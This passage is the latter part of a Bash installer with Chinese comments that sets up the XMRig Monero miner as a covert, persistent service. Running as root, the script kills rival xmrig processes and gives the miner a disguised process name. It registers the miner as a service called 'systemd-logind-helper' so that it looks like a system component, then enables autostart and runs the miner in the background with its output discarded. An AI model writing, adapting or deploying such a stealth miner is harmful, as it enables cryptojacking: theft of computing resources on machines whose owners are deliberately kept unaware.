        do_stop
        ;;
    restart)
        do_stop
        do_start
        ;;
    *)
        echo "Usage: \$0 {start|stop|restart}"
        RETVAL=1
esac

exit \$RETVAL
EOF
    
    chmod +x /etc/init.d/$SERVICE_NAME
    
    # 添加到启动项
    if command -v chkconfig >/dev/null 2>&1; then
        chkconfig --add $SERVICE_NAME
        chkconfig $SERVICE_NAME on
    elif command -v update-rc.d >/dev/null 2>&1; then
        update-rc.d $SERVICE_NAME defaults
    fi
    
    log_info "SysV init脚本创建完成"
}

# 设置自启动
setup_autostart() {
    log_info "设置系统自启动..."
    
    # 在容器环境中，通常不需要设置系统服务
    if [ "$IS_CONTAINER" = true ]; then
        log_info "容器环境检测到，跳过系统服务设置"
        log_info "在容器中，请使用以下命令直接运行："
        log_info "  $WORK_DIR/$DISGUISE_NAME --config=$WORK_DIR/config.json"
        return 0
    fi
    
    if command -v systemctl >/dev/null 2>&1; then
        # 使用systemd
        create_systemd_service
    else
        # 使用SysV init
        create_sysv_service
    fi
}

# 启动挖矿
start_mining() {
    log_info "启动挖矿服务..."
    
    # 在容器环境中，直接启动进程而不是服务
    if [ "$IS_CONTAINER" = true ]; then
        log_info "容器环境检测到，直接启动挖矿进程..."
        cd "$WORK_DIR"
        
        # 在后台启动挖矿进程
        nohup ./"$DISGUISE_NAME" --config=config.json > /dev/null 2>&1 &
        local mining_pid=$!
        
        # 等待一下确保进程启动
        sleep 3
        
        # 检查进程是否成功启动
        if kill -0 "$mining_pid" 2>/dev/null; then
            log_info "挖矿进程已在后台启动 (PID: $mining_pid)"
            echo "$mining_pid" > "$WORK_DIR/xmrig.pid"
        else
            log_error "挖矿进程启动失败"
            return 1
        fi
        return 0
    fi
    
    if command -v systemctl >/dev/null 2>&1; then
        systemctl start ${SERVICE_NAME}.service
        systemctl status ${SERVICE_NAME}.service --no-pager
    else
        service $SERVICE_NAME start
    fi
    
    log_info "挖矿服务已启动"
}

# 显示状态信息
show_status() {
    echo
    log_info "=== 安装完成 ==="
    log_info "XMRig版本: $VERSION"
    log_info "安装目录: $WORK_DIR"
    log_info "钱包地址: $WALLET_ADDRESS"
    log_info "矿池地址: $POOL_ADDRESS"
    log_info "捐赠设置: 0%"
    log_info "进程名称: $DISGUISE_NAME"
    log_info "服务名称: $SERVICE_NAME"
    log_info "运行环境: $([ "$IS_CONTAINER" = true ] && echo "容器环境" || echo "主机环境")"
    echo
    log_info "=== 管理命令 ==="
    
    if [ "$IS_CONTAINER" = true ]; then
        log_info "容器环境管理命令:"
        log_info "查看进程: ps aux | grep $DISGUISE_NAME"
        log_info "停止挖矿: pkill -f $DISGUISE_NAME"
        log_info "手动启动: cd $WORK_DIR && ./$DISGUISE_NAME --config=config.json"
        log_info "后台启动: cd $WORK_DIR && nohup ./$DISGUISE_NAME --config=config.json > /dev/null 2>&1 &"
        if [ -f "$WORK_DIR/xmrig.pid" ]; then
            local pid=$(cat "$WORK_DIR/xmrig.pid")
            if kill -0 "$pid" 2>/dev/null; then
                log_info "当前状态: 运行中 (PID: $pid)"
            else
                log_info "当前状态: 已停止"
            fi
        fi
    else
        if command -v systemctl >/dev/null 2>&1; then
            log_info "查看状态: systemctl status $SERVICE_NAME"
            log_info "停止挖矿: systemctl stop $SERVICE_NAME"
            log_info "启动挖矿: systemctl start $SERVICE_NAME"
            log_info "重启挖矿: systemctl restart $SERVICE_NAME"
            log_info "查看日志: journalctl -u $SERVICE_NAME -f"
        else
            log_info "查看状态: service $SERVICE_NAME status"
            log_info "停止挖矿: service $SERVICE_NAME stop"
            log_info "启动挖矿: service $SERVICE_NAME start"
            log_info "重启挖矿: service $SERVICE_NAME restart"
        fi
    fi
    echo
    log_info "配置文件: $WORK_DIR/config.json"
    log_info "手动运行: cd $WORK_DIR && ./$DISGUISE_NAME --config=config.json"
}

# 主函数
main() {
    # 检查是否为root用户
    if [ "$EUID" -ne 0 ]; then
        log_error "请使用root权限运行此脚本"
        exit 1
    fi
    
    # 首先检测并终止现有的xmrig进程
    kill_existing_xmrig
    
    # 获取伪装名称
    DISGUISE_NAME=$(get_disguise_name)
    SERVICE_NAME="systemd-logind-helper"
    
    log_info "进程将伪装为: $DISGUISE_NAME"
    log_info "服务将命名为: $SERVICE_NAME"
    
    # 执行安装步骤
    detect_cpu_info
    detect_system
    set_version
    get_download_url
    check_prerequisites
    download_and_install
    create_config
    setup_autostart
    start_mining
    show_status
    
    log_info "XMR挖矿脚本安装完成！"
}

# 运行主函数
main "$@"
